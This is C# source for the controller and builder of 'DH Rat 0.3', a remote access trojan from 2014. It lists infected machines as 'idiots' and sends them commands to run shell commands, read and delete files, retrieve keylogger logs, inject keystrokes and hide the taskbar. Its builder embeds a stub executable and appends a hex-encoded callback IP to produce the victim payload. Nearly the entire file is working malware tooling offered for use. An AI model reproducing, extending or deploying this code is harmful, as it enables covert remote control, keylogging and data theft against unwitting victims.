// DH Rat 0.3
// (C) Doddy Hackman 2014
// Credits :  
// Based on "Reverse Connection RAT Example" made by xSilent
// Link : http://www.hackforums.net/showthread.php?tid=827069
// Thanks to xSilent

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

using System.Threading; 
using System.Net.Sockets; 
using System.Net; 
using System.Text.RegularExpressions;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;

namespace builder
{
    public partial class Form1 : Form
    {

        TcpListener tcp_server;
        Thread thread_server;
        bool estoy_activo = false;

        public Form1()
        {
            InitializeComponent();
        }

        // Functions

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();

        }

        public void extraer_recurso(string name, string save)
        {

            // Based on : http://www.c-sharpcorner.com/uploadfile/40e97e/saving-an-embedded-file-in-C-Sharp/
            // Thanks to Jean Paul

            try
            {
                Stream bajando_recurso = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
                FileStream yacasi = new FileStream(save, FileMode.CreateNew);
                for (int count = 0; count < bajando_recurso.Length; count++)
                {
                    byte down = Convert.ToByte(bajando_recurso.ReadByte());
                    yacasi.WriteByte(down);
                }
                yacasi.Close();
            }
            catch
            {
                MessageBox.Show("Error unpacking resource");
            }

        }

        //

        private void mephobiaButton1_Click(object sender, EventArgs e)
        {

            if (System.IO.File.Exists("logs_console.out"))
            {
                System.IO.File.Delete("logs_console.out");
            }

            if (estoy_activo)
            {
                thread_server.Abort();
                tcp_server.Stop();
            }

            Application.Exit();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            contextMenuStrip1.ForeColor = System.Drawing.ColorTranslator.FromHtml("#AAAAAA");
            contextMenuStrip2.ForeColor = System.Drawing.ColorTranslator.FromHtml("#AAAAAA");
            contextMenuStrip3.ForeColor = System.Drawing.ColorTranslator.FromHtml("#AAAAAA");

            if (System.IO.File.Exists("logs_console.out"))
            {
                System.IO.File.Delete("logs_console.out");
            }

            limpiar_consola();

        }

        public void savefile(string file, string texto)
        {
            try
            {
                System.IO.StreamWriter save = new System.IO.StreamWriter(file, true);
                save.Write(texto);
                save.Close();
            }
            catch
            {
                //
            }
        }

        private void onlineToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Text = "[ONLINE] - DH Rat 0.3 (C) Doddy Hackman 2014 -";
            this.Refresh();
            this.Invalidate();
            leer_consola.Enabled = true;
            int port = 666; 
            tcp_server = new TcpListener(IPAddress.Any, port); 
            thread_server = new Thread(panel_control); 
            thread_server.Start();
            estoy_activo = true;
        }

        private void offlineToolStripMenuItem_Click(object sender, EventArgs e)
        {
            thread_server.Abort();
            tcp_server.Stop();
            estoy_activo = false;
            this.Text = "[OFFLINE] - DH Rat 0.3 (C) Doddy Hackman 2014 -";
        }

        public void panel_control()
        {
            tcp_server.Start();
            while (true)
            {
                ServerManager socket_server_now = new ServerManager(tcp_server.AcceptTcpClient()); 
                socket_server_now.evento_panel_control_now += new ServerManager.cargando_datos(evento_panel_control);
            }
        }

        void evento_panel_control(ServerManager vengo, string data)
        {
            Match regex = Regex.Match(data, "-ACATOY-LLEGUE-ACATOY--(.*)--(.*)--(.*)--(.*)--(.*)--", RegexOptions.IgnoreCase);

            string host = regex.Groups[1].Value;
            string ip = regex.Groups[2].Value;
            string country = regex.Groups[3].Value;
            string username = regex.Groups[4].Value;
            string os = regex.Groups[5].Value;

            if (regex.Success) 
            {
                Invoke(new _NewIdiot(NewIdiot),vengo,host,ip,country,username,os); 
            }

            regex = Regex.Match(data,"-RtaCommand-(.*)-RtaCommand-", RegexOptions.IgnoreCase); 
            if (regex.Success) 
            {
                string respuesta = regex.Groups[1].Value;
                savefile("logs_console.out", respuesta);
            }
        }

        delegate void _NewIdiot(ServerManager vengo,string host,string ip,string country,string username, string os);
        void NewIdiot(ServerManager vengo,string host,string ip,string country,string username,string os)
        {
            ListViewItem agregar = new ListViewItem(); 
            agregar.Text = host;
            agregar.SubItems.Add(ip);
            agregar.SubItems.Add(country);
            agregar.SubItems.Add(username);
            agregar.SubItems.Add(os);
            agregar.Tag = vengo; 
            listView1.Items.Add(agregar); 
        }

        private void leer_consola_Tick(object sender, EventArgs e)
        {
            if (System.IO.File.Exists("logs_console.out"))
            {
                string respuesta = System.IO.File.ReadAllText("logs_console.out");
                respuesta = respuesta.Replace("[barra_n]", "\n");
                richTextBox1.AppendText(respuesta + "\n");
                System.IO.File.Delete("logs_console.out");
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-OpenCD-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag; 
            manager.respondo_al_idiot("-Command-CloseCD-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Directory", "DH Rat","", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-ListDirectory-Command--Arg1-"+arg1+"-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write File", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-Delete-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write File", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-ReadFile-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Text", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-SendKeys-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Text", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-OpenWord-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Text", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-Message-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Text", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-Talk-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-ListProcess-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Command", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-CMD-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");

        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            string arg1 = Interaction.InputBox("Write Time", "DH Rat", "", -1, -1);
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-CrazyMouse-Command--Arg1-" + arg1 + "-Arg1-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-HideTaskbar-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-ShowTaskbar-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-HideIcons-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-ShowIcons-Command-");
            MessageBox.Show("Command Executed");
        }

        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            ServerManager manager = (ServerManager)listView1.Items[listView1.FocusedItem.Index].Tag;
            manager.respondo_al_idiot("-Command-KeyloggerLogs-Command-");
            MessageBox.Show("Command Executed");
        }

        public void limpiar_consola()
        {
            richTextBox1.Clear();
            richTextBox1.AppendText(" - DH Rat - Command Console -\n");
            richTextBox1.AppendText("  Running program version 0.3\n");
            richTextBox1.AppendText("-----------------------------------\n\n");
            richTextBox1.AppendText("Welcome to hell\n\n");
        }

        private void cleanToolStripMenuItem_Click(object sender, EventArgs e)
        {
            limpiar_consola();
        }

        private void mephobiaButton2_Click(object sender, EventArgs e)
        {

            string linea_generada = "";
            string ip = mephobiaTextBox1.Text;

            extraer_recurso("builder.Resources.stub.exe", "stub.exe");

            string check_stub = AppDomain.CurrentDomain.BaseDirectory + "/stub.exe";
            string work_on_stub = AppDomain.CurrentDomain.BaseDirectory + "/done.exe";

            if (File.Exists(check_stub))
            {

                if (File.Exists(work_on_stub))
                {
                    System.IO.File.Delete(work_on_stub);
                }

                System.IO.File.Copy(check_stub, work_on_stub);

                linea_generada = "-ip-" + ip + "-ip-";

                string generado = hexencode(linea_generada);
                string linea_final = "-63686175-" + generado + "-63686175-";

                FileStream abriendo = new FileStream(work_on_stub, FileMode.Append);
                BinaryWriter seteando = new BinaryWriter(abriendo);
                seteando.Write(linea_final);
                seteando.Flush();
                seteando.Close();
                abriendo.Close();

                //MessageBox.Show(generado);
                //MessageBox.Show(hexdecode(generado));

                try
                {
                    System.IO.File.Delete(check_stub);
                }
                catch
                {
                    //
                }

                MessageBox.Show("Server Generated");

            }
            else
            {
                MessageBox.Show("Stub not found");
            }

        }
         
    }
}

// The End ?
